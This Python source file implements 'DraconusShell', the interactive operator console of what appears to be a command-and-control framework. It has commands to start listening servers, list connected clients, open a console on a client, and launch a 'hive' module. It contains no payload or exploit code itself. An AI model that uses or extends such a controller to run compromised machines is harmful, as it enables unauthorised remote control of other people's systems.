import os
import click
from click_shell import shell
from termcolor import cprint
from time import sleep

from .client_shell import ClientShell
from .queen_shell import QueenShell

class DraconusShell:
    def __init__(self, main_shell: object, commander: object):
        self.main_shell = main_shell
        self.C2 = commander
        self.help = self.main_shell.help
        self.QueenShell = QueenShell(self.main_shell, self.C2)

        self.cmd_SYS = {"cmd_type" : "sys"}
        self.cmd_SEND = self.C2.cmd_SendRaw
        self.cmd_RECV = self.C2.cmd_Recive

        self.print_sort = self.main_shell.msg_sorter.sort_Text
        self.print_title = self.main_shell.msg_sorter.make_Title
    
    def shellExit(self, *args, **kwargs) -> None:
        print("Exit Shell Program")
    

    def shellBuild(self) -> object:

        @shell(prompt=f"[DRACONUS] >>", intro="------ Welcome To Draconus ! Put help for commands list ------- ", on_finished=self.shellExit)
        def dracoShell() -> None:
            pass

        
        @dracoShell.command()
        def help() -> None:
            self.print_title("Draconus Help")
            print("\n")
            self.print_sort("exit", "Exit Shell. Draconus still working.")
            self.print_sort("quit", "Close Draconus and exit shell.")
            self.print_sort("clr, clear", "Clear Screen")
            self.print_sort("task", "Show Active Task/Threads")
            self.print_sort("server [name] [port] [--type]", "Building server. See 'server --help'.")
            self.print_sort("close [name]", "Close specific server.")
            self.print_sort("show -[option]", "Show active servers and connected clients. See 'show --help'")
            self.print_sort("conn [client_ID]", "Enter client connection console.")
            self.print_title("")
        
        @dracoShell.command()
        def clr() -> None:
            os.system("clear")
        
        @dracoShell.command()
        def clear() -> None:
            os.system("clear")
        

        @dracoShell.command()
        def quit() -> None:
            self.C2.Quit()
            os._exit(0)
        
        @dracoShell.command()
        def hive() -> None:
            self.QueenShell.Start()
        
        @dracoShell.command()
        def task() -> None:
            cmd = self.cmd_SYS.copy()
            cmd["cmd"] = "task_show"
            self.cmd_SEND(cmd)

        @dracoShell.command()
        @click.argument("name", required=False)
        @click.argument("port", required=False)
        @click.option("--types", "-t", required=False, help="Server type.")
        @click.option("--help", "show_help", required=False, is_flag=True, help="Show help.")
        def server(name, port, types, show_help) -> None:
            if show_help:
                self.help.DRACONUS_SERVER_TYPE_HELP
                return
            if not name or not port:
                print("ERROR: Command required server name and server port number.")
                return
            data_serv = {
                "name" : name,
                "port" : port,
            }
            if types:
                data_serv["serv_type"] = types

            cmd = self.cmd_SYS.copy()
            cmd["cmd"] = "build_server"
            cmd["server_data"] = data_serv
            self.cmd_SEND(cmd)
        
        @dracoShell.command()
        @click.argument("name")
        def close(name) -> None:
            cmd = self.cmd_SYS.copy()
            cmd["cmd"] = "close"
            cmd["server_name"] = name
            self.cmd_SEND(cmd)
        

        @dracoShell.command()
        @click.argument("client_id")
        def conn(client_id) -> None:
            cmd = self.cmd_SYS.copy()
            cmd["cmd"] = "client_conn"
            cmd["client_id"] = client_id
            self.cmd_SEND(cmd)
            response = self.cmd_RECV()
            if not response or response == {}:
                return
            client_shell = ClientShell(self, self.C2, response)
            client_shell.Start()
        
        @dracoShell.command()
        @click.option("--servers", "-s", required=False, is_flag=True, help="Show active servers.")
        @click.option("--clients", "-c", required=False, is_flag=True, help="Show connected clients.")
        def show(servers, clients) -> None:
            if clients:
                cmd = self.cmd_SYS.copy()
                cmd["cmd"] = "client_show"
                self.cmd_SEND(cmd)
                # preventing two commands from merging on a network socket
                sleep(0.1)
            if servers:
                cmd = self.cmd_SYS.copy()
                cmd["cmd"] = "server_show"
                self.cmd_SEND(cmd)


        

        return dracoShell
    


    def Start(self) -> None:
        draco_shell = self.shellBuild()
        sleep(0.5)
        draco_shell()



